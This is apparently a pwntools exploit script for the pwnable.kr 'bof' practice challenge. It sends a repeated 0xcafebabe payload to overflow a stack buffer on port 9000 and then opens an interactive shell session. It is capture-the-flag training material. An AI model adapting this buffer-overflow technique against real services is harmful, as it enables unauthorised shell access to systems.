from pwn import *

# context.log_level = 'debug'

r = remote('pwnable.kr', 9000)
# r = process('./bof')

# gdb.attach(r, '''
# n
# ''')

shellcode = p32(0xcafebabe) * 40
# shellcode = cyclic(200)
r.sendline(shellcode)


r.interactive()
